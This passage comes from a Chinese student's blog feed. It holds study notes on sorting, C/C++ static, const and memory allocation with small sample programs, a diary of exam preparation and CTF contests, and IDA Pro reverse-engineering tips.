<li><p>堆排序<br>这个最难写了，我肯定不会用这个<br>堆<br>用完全二叉树实现, 父亲(i)的值比儿子(2i, 2i + 1)的值要大(小), 就对应着大(小)顶堆</p>
</li>
</ol>
<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>归并也算是…二分的结构吧<br>两两合并， 一直到合成一个…和希尔排序有点像???<br>也不太像…</p>
<p>然而归并是稳定的, 希尔是不稳定的</p>
<p>而且归并有二路归并，四路， 八路…????</p>
<h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><p>其实还感觉…这一块比较乱…我学这么多排序干啥呢</p>
]]></content>
      
        <categories>
            
            <category> 备忘 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 复习 数据结构 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[static in c]]></title>
      <url>/2017/08/25/static-in-c/</url>
      <content type="html"><![CDATA[<h2 id="静态全局变量-amp-静态局部变量"><a href="#静态全局变量-amp-静态局部变量" class="headerlink" title="静态全局变量 &amp; 静态局部变量"></a>静态全局变量 &amp; 静态局部变量</h2><p>相同点就是, 静态的话, 就是放在数据段(bss or data)了, 不放在栈上边, 所以生存周期就是很长对吧</p>
<h3 id="静态全局变量"><a href="#静态全局变量" class="headerlink" title="静态全局变量"></a>静态全局变量</h3><p>全局变量就算是不静态, 也放在数据段, 对不对, 所以, 静态的全局变量这个静态要达到的效果是, <em>该变量只在本文件中可见</em>, 不能extern到其他文件里</p>
<h3 id="静态局部变量"><a href="#静态局部变量" class="headerlink" title="静态局部变量"></a>静态局部变量</h3><p>既然是局部变量, 这个静态其实就像js里函数闭包一样, 想要维持一种状态, 利用了, <em>静态变量只初始化一次</em>, 其实想一想, 我们通常说的静态就是编译时, 动态是运行时, 这里的只初始化一次, 大概就是这样子???一次性语句….</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    num<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="静态成员方法-amp-静态成员变量-OOP"><a href="#静态成员方法-amp-静态成员变量-OOP" class="headerlink" title="静态成员方法 &amp; 静态成员变量 (OOP)"></a>静态成员方法 &amp; 静态成员变量 (OOP)</h2><p>静态方法可以认为是, 类方法…<br>静态方法不能访问不静态的成员变量, 因为传参的时候不会把this指针传给他</p>
<p>同理, 静态成员变量可以认为是类变量, 用来存储类级别的一些内容, 比如实例个数</p>
<p>这些, 类级的变量可以直接通过类名而无需通过实例来访问</p>
<p>一个要注意的地方是, 静态成员在类内只是申明的样子,</p>
<ol>
<li>静态方法也要在类外定义</li>
<li>静态成员变量要在类外写一个定义(当然可以顺手初始化)</li>
</ol>
<blockquote>
<p>当然例外是const + static 可以在类内…忽略这个特例</p>
</blockquote>
<h2 id="静态函数-全局"><a href="#静态函数-全局" class="headerlink" title="静态函数(全局)"></a>静态函数(全局)</h2><p>这个其实就和全局静态变量是一个道理, 是为了隐藏作用域, <em>该函数只能在本文件中使用</em>, 这样子其他文件中就可以使用同名的函数了</p>
<blockquote>
<p>因为函数里不能定义函数, 所以说到函数, 肯定是全局的了哦</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> c 复习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[malloc/free 和 new/delete]]></title>
      <url>/2017/08/25/malloc-free-%E5%92%8C-new-delete/</url>
      <content type="html"><![CDATA[<p>malloc和new应当是都在堆上分配内存, 但有一点区别</p>
<h2 id="mallloc-amp-free"><a href="#mallloc-amp-free" class="headerlink" title="mallloc &amp; free"></a>mallloc &amp; free</h2><p>从malloc工作原理来看, 就仅仅是分配一块大小合适的地方…以前笔记也有记录过, 最初是从顶块上割下来一块用, free掉后会进入fast bin, 或者其他的bin链表里, 再后来malloc的话, 根据大小, 从不同的bin上取下来, 返回的是User Data的起始地址, 不包括chunk header, 很纯粹, 只是分配空间给你, 没有初始化还是其他什么的内容</p>
<p>从语言层面来看, malloc返回的是<code>void *</code>的类型, 所以在使用的时候要强制类型转换一下</p>
<p>对了, 实际使用过程中, malloc之后应当检测一下, 结果是不是NULL, 然后再使用(我下面没写)</p>
<p>free的话就是…emmmmm, 把分出去的chunk给收回来, 放到空闲链表里…其实就是增加了<code>fd</code>, <code>bk</code>, 指针</p>
<p>我写了一个蹩脚的链表. 然后怀疑人生中</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> node <span class="token punctuation">{</span>
    <span class="token keyword">struct</span> node <span class="token operator">*</span> next<span class="token punctuation">;</span>
    <span class="token keyword">int</span> val<span class="token punctuation">;</span>
<span class="token punctuation">}</span>Node<span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Node <span class="token operator">*</span> list <span class="token operator">=</span> <span class="token punctuation">(</span>Node <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list <span class="token operator">-></span> val <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>
    list <span class="token operator">-></span> next <span class="token operator">=</span> <span class="token punctuation">(</span>Node <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list <span class="token operator">-></span> next <span class="token operator">-></span> val <span class="token operator">=</span> <span class="token number">222</span><span class="token punctuation">;</span>
    list <span class="token operator">-></span> next <span class="token operator">-></span> next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    Node <span class="token operator">*</span> ptr <span class="token operator">=</span> list<span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> ptr <span class="token operator">-></span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ptr <span class="token operator">=</span> ptr <span class="token operator">-></span> next<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"print done\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">=</span> list<span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        Node <span class="token operator">*</span> temptr <span class="token operator">=</span> ptr<span class="token punctuation">;</span>
        ptr <span class="token operator">=</span> ptr <span class="token operator">-></span> next<span class="token punctuation">;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>temptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free done\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="new-amp-delete"><a href="#new-amp-delete" class="headerlink" title="new &amp; delete"></a>new &amp; delete</h2><p>这个其实我不太熟悉, 因为我不太会oop, 所以很少用<br>只知道new是C++的一个操作符…</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span><span class="token operator">:</span>
        <span class="token keyword">static</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token keyword">int</span> a<span class="token punctuation">;</span>
        <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>num<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"num++"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
        <span class="token function">A</span><span class="token punctuation">(</span><span class="token keyword">int</span> _a<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">a</span><span class="token punctuation">(</span>_a <span class="token operator">*</span> _a<span class="token punctuation">)</span> <span class="token punctuation">{</span>num<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"num++"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
        <span class="token keyword">void</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]%d a: %d"</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> A<span class="token operator">::</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    A <span class="token operator">*</span> a1 <span class="token operator">=</span> <span class="token keyword">new</span> A<span class="token punctuation">;</span>
    a1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    A <span class="token operator">*</span> a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a2 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    A a3<span class="token punctuation">;</span>
    a3<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    A <span class="token operator">*</span> a4 <span class="token operator">=</span> <span class="token punctuation">(</span>A <span class="token operator">*</span> <span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a4 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">/*
num++
[*]1 a: 0

num++
[*]2 a: 0

num++
[*]3 a: 2

[*]3 a: 0
*/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先有个重要的问题就是, 类内的静态成员变量要在类外进行定义…不然就会出现未定义的引用..就像我这里写的那个<code>int A::num = 0</code><br>类内部写的静态成员, 相当于是只做了一个申明, 只是有了一个scope, 但要使用(存储)的话必须要在类外定义一下</p>
<blockquote>
<p>静态其实是讲与程序有着相同的生命周期…所以静态变量即便是局部的…也只是作用域在局部…但却是一直存在的, 所以也只会经历一次初始化, 从存储上讲的话, 静态变量和全局变量是一样的…未初始化的在bss, 初始化的在data</p>
</blockquote>
<p>跑题了….从上面就可以看出来的new和malloc的区别</p>
<ol>
<li>malloc返回的指针是<code>void *</code>的, 需要强制转化, 而new的话返回的就不需要了</li>
<li>malloc分配的大小需要自己定, new的话不需要</li>
<li>malloc不会调用构造函数…这个从最后一个没有<code>num++</code>可以看出来,当然简单数据类型的话new也不调用</li>
<li>new分配失败好像会触发异常, 所以不能通过是否返回NULL来判断分配成功与否</li>
</ol>
<p>所以相应的delete不光是会回收空间, 可能还会调用析构函数</p>
<p>据说是new分三个过程</p>
<ol>
<li>调用operator new(size), 比如 new int, 差不多汇编是这样子<pre class="line-numbers language-asm"><code class="language-asm">push 4
call operator new(size)
add esp, 4
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>在分配的内存空间上, 调用构造函数(基本类型没有在这个操作)</li>
<li>转换指针类型??? (这个我也不太确定)</li>
</ol>
<p>这里看到上面四个生成类的方法, 还想讲几点</p>
<h3 id="有括号和没括号的区别"><a href="#有括号和没括号的区别" class="headerlink" title="有括号和没括号的区别"></a>有括号和没括号的区别</h3><ol>
<li>对于内置类型, 比如int<pre class="line-numbers language-c"><code class="language-c">new <span class="token keyword">int</span> <span class="token comment" spellcheck="true">// 不会初始化</span>
new <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//会初始化为0</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>对于类</li>
</ol>
<ul>
<li>没括号是默认初始化</li>
<li>有括号是值初始化</li>
</ul>
<p>结论: 我还是加括号吧, 这个我还是不太清楚</p>
<h3 id="用new和不用new的区别"><a href="#用new和不用new的区别" class="headerlink" title="用new和不用new的区别"></a>用new和不用new的区别</h3><p>new底下调用的是malloc, 是在堆上分配内存<br>不new的话…就是在栈上了呗…</p>
<p>另外, 不new的话, 也有隐和显两种写法</p>
<pre class="line-numbers language-c"><code class="language-c">A a <span class="token operator">=</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
A <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>差不多就这样子了</p>
]]></content>
      
        
        <tags>
            
            <tag> c 复习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[const in c]]></title>
      <url>/2017/08/24/const-in-c/</url>
      <content type="html"><![CDATA[<p>一直不太知道const…</p>
<h2 id="指针上使用const"><a href="#指针上使用const" class="headerlink" title="指针上使用const"></a>指针上使用const</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> p<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//p的值不可变, 也就是指向不能变</span>

<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> p<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//p所指向的内容不可变, [*]常用</span>
<span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span> p<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 同上, p指向的内容不能变</span>

<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> p<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//都不可变</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果const在指针的左边</p>
<p>如果const在指针的右边</p>
<h2 id="const做函数形参"><a href="#const做函数形参" class="headerlink" title="const做函数形参"></a>const做函数形参</h2><p>普通形参加不加const限定符对实参没有影响，引用形参和指针形参前面没有const限定符时，实参必须是非const的<br>所以要保证的是指针所指向的内容不变…所以是<br>fun(const int * arg)<br>的形式, 注意const位置</p>
<h2 id="const成员函数"><a href="#const成员函数" class="headerlink" title="const成员函数"></a>const成员函数</h2><p>大概是这样子的</p>
<pre class="line-numbers language-c"><code class="language-c">class A <span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>arg<span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>任何..不修改成员变量的函数都应当声明为const的. 这样子的话如果试图修改成员变量, 将报错???….就像是java里@override差不多. 为了增强程序的鲁棒性</p>
<p>但, 好像实际原因是这里的const其实是把<code>this *</code>给const掉了, 在汇编层面,this指针是成员函数的第一个参数(g++), MSVC的话由于是this call, 也没啥第一个不第一个</p>
<p>原来的this指针只是指向不能变, 当给成员函数加了const修饰以后, 就是传给函数的this指针指向的对象也不能变…所以就不能修改成员变量了</p>
<h3 id="const修饰的对象"><a href="#const修饰的对象" class="headerlink" title="const修饰的对象"></a>const修饰的对象</h3><p>const修饰的对象, 不能调用非const的成员函数</p>
<h2 id="CV限定符"><a href="#CV限定符" class="headerlink" title="CV限定符"></a>CV限定符</h2><p>C(const)<br>V(volatile)</p>
<ol>
<li>在C++中，非成员函数不能含有CV限定</li>
<li>在C++中，静态成员函数不能有CV限定</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[对一段时间的记录]]></title>
      <url>/2017/08/24/%E5%AF%B9%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<h2 id="2017-08-24"><a href="#2017-08-24" class="headerlink" title="2017-08-24"></a>2017-08-24</h2><h3 id="15-50"><a href="#15-50" class="headerlink" title="15:50"></a>15:50</h3><p>今天是<code>2017-08-24</code>, 昨天到了学校<br>今天早上睡到了差不多8点多, 中午睡了一个小时, 现在还有点小困<br>买了玻璃杯放在宿舍喝水<br>保研的事情还没定下来, 还是很慌, 准备这几天复习一下复试的课程<br>昨晚看了下阿里的笔试题目…准备答得时候发现辣鸡输入法又GG了…<br>所以也就是看了下<br>下午, 把手里的RE4B再看一点…这书翻译的简直了…早知道直接看gitBook了…<br>明天就把假期看完的这些书锁起来, 不动了, 然后就好好复习<br>就这样子吧, 我去看书了</p>
<h2 id="2017-08-25"><a href="#2017-08-25" class="headerlink" title="2017-08-25"></a>2017-08-25</h2><h3 id="15-22"><a href="#15-22" class="headerlink" title="15:22"></a>15:22</h3><p>发现自己链表都不会写了, 好慌啊…</p>
<h3 id="17-18"><a href="#17-18" class="headerlink" title="17:18"></a>17:18</h3><p>本来是学写链表的, 发现不会C++, 结果刚学了一下</p>
<h3 id="19-07"><a href="#19-07" class="headerlink" title="19.07"></a>19.07</h3><p>吃完饭, 休息了一下, 继续学数据结构</p>
<h2 id="2017-08-26"><a href="#2017-08-26" class="headerlink" title="2017-08-26"></a>2017-08-26</h2><p>打了一天xnuca, 这一场是web…其实就是搜索exp大赛, 毁我青春…<br>打的忘记了滴滴的内退笔试…GG…没给我发邮件啊.md醉了</p>
<h2 id="2017-08-27"><a href="#2017-08-27" class="headerlink" title="2017-08-27"></a>2017-08-27</h2><p>复习数据结构…</p>
<h2 id="2017-08-28-2017-09-08"><a href="#2017-08-28-2017-09-08" class="headerlink" title="2017-08-28 ~ 2017-09-08"></a>2017-08-28 ~ 2017-09-08</h2><p>大概十天时间…打了ISG, 不知道名次, 但据说可以去上海颁奖<br><em>粗略</em>复习了数据结构, 操作系统, 计算机网络, 概率论, 和离散的 <em>一部分</em> 内容<br>还没准备机试….马上准备, 明天是周六, 周末..有大把时间抓紧时间加油</p>
<p>今天投递一下计算所, 启明, 绿盟, 深信服 QAQ, 就当做一下笔试题<br>单元我信工所初试能过</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[hook入门]]></title>
      <url>/2017/08/14/hook%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>安卓的参考蒸米的安卓动态调试七种武器之HOOK</p>
<p>没有网好痛苦==</p>
<p>不想看了, 想睡觉</p>
]]></content>
      
        
        <tags>
            
            <tag> mobile </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IDA使用入门]]></title>
      <url>/2017/08/12/IDA%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>主要是记下一些快捷键?</p>
<ol>
<li>IDA View<br>空格可以切换Graph视图和正常视图<br>Graph其实很少用,所以可以在<br>Options - General - Graph里可以把<code>use graph view by default</code>勾掉</li>
</ol>
<ol>
<li>交叉引用<pre class="line-numbers language-asm"><code class="language-asm">some asm code   ; CODE XREF: some location
some asm code   ; DATA XREF: some location
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ol>
<ul>
<li>代码交叉引用</li>
<li>数据交叉引用</li>
</ul>
<ol>
<li>Hex View<br>有的时候是问号, 表示IDA无法识别给定虚拟地址范围内的值<br>如果包含bss的话, 就会这样子…</li>
</ol>
<p>明天早起继续看</p>
<ol>
<li><p>跳转<br>G 跳转到…<br>Esc 后退</p>
</li>
<li><p>重命名<br>N</p>
</li>
<li><p>举了一个cdecl不需要清理参数的例子<br>正常情况</p>
<pre class="line-numbers language-asm"><code class="language-asm">; demo_call(1, 2, 3, 4)
push 4
push 3
push 2
push 1
call demo_call
add  esp, 16    ; 调用者清理参数
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<p>有的时候, 没有采用push的方法</p>
<pre class="line-numbers language-asm"><code class="language-asm">; demo_call(1, 2, 3, 4)
mov [esp+12], 4
mov [esp+8], 3
mov [esp+4], 2
mov [esp], 1
call demo_call
; 不需要调用方清理参数
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li><p>搜索<br>ALT + T 文本搜索<br>ALT + B 二进制搜索</p>
</li>
<li><p>代码数据互换<br>U(undefine)  取消定义 code变成原始一个一个byte</p>
</li>
</ol>
<p>C(code)     <code>data -&gt; code</code><br>D(data)     <code>code -&gt; data</code> 在数据转盘里切换data种类</p>
<p>数据转盘里设置 <code>options -&gt; Steup data types</code></p>
<ol>
<li><p>数据相关<br>db 1字节    byte<br>dw 2字节    word<br>dd 4字节    dword<br>dq 8字节    qword</p>
</li>
<li><p>数组<br>选中数据开头, <code>Edit -&gt; Array</code>,可以创建数组<br>这样子关于数组的访问就是基于<code>Array_head + offset</code>的形式<br>后来又遇到了问题…我的数组每个元素多大…怎么在建立数组菜单里没法选择<br>然后发现是需要先把数据开头第一个元素变成想要的类型, 比如word<br>然后再新建数组, 得到的就是数组元素大小就是和第一个元素一样的</p>
</li>
</ol>
<ol>
<li>结构体<br>结构体, 几乎没法直接分辨是用了结构体<br>要自己手动识别, 然后添加<br>一般一个变量(加不同间隔)偏移量的..这个变量可能就是某种类型的<br>特别是看到有的时候会把什么函数指针啊, 之类的赋值给他的成员<br>基本就是个类or结构体了</li>
</ol>
<p>在建立结构体的时候要注意那个, emmmmm, 注意在结构体末尾那一行点新建元素…不是开头那一行, 具体是怎么的来着…忘记了, 算了, 2333333</p>
<h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><p>C++ 果然复杂的…毛线一样</p>
<ol>
<li><p>this<br>所有非静态C++成员函数都是用this指针<br>把this看做是传递到所有非静态成员函数的第一个隐含参数<br>MS VC++ 遵循thiscall, 把this传入到ECX寄存器<br>GUN g++ 把this看成最左边的参数,最后压入栈</p>
</li>
<li><p>虚函数 虚表<br><code>包含虚函数的类</code>的第一个数据成员是一个指针,叫做虚表指针(vtable pointer), 指向他的虚表<br>虚表是一个包含类中<code>指向每一个虚函数的指针</code>的表</p>
</li>
</ol>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">BaseCalss</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span> 
        <span class="token function">BaseClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">vfunc1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">vfunc2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">vfunc3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">vfunc4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span><span class="token operator">:</span>
        <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">SubClass</span><span class="token operator">:</span> <span class="token keyword">public</span> BaseCalss <span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span> 
        <span class="token function">SubClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">vfunc1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">vfunc3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">vfunc5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span><span class="token operator">:</span>
        <span class="token keyword">int</span> z<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>BaseClass含有 4个虚函数 + 3个数据成员(vtable pointer, x, y)<br>SubClass含有 5个虚函数 + 4个数据成员(vtable pointer, x, y, z)</p>
<p>我照着抄写的例子怎么通不过…好气啊…</p>
<p>vtable是放在rodata段的…那么就不能hack了是吗…<br>emmm,好像不需要hack这个表…我们的hack点在于把对象中指向vtable的指针的指向改变…</p>
<p>其实不太懂,我这里个g++涉及到类, 比如 new, 和对象成员函数调用都是用了fastcall</p>
<p>而且这一块的汇编..惨不忍睹…<br>我还是太菜了</p>
<h3 id="RTTI-Runtime-Type-Identification"><a href="#RTTI-Runtime-Type-Identification" class="headerlink" title="RTTI(Runtime Type Identification)"></a>RTTI(Runtime Type Identification)</h3><p>运行时类型识别</p>
<h3 id="HITCON-Training-Lab15"><a href="#HITCON-Training-Lab15" class="headerlink" title="HITCON Training Lab15"></a>HITCON Training Lab15</h3><p>就是一个关于类的pwn…C++的逆向还是太….<br>看着太累了</p>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p>上次做题目,patch是使劲点patch,结果发现没毛用<br>后来在IDA里记下offset, 然后用<code>GHex</code>修改的…</p>
<p>今天翻开书…看到这样子一段话</p>
<blockquote>
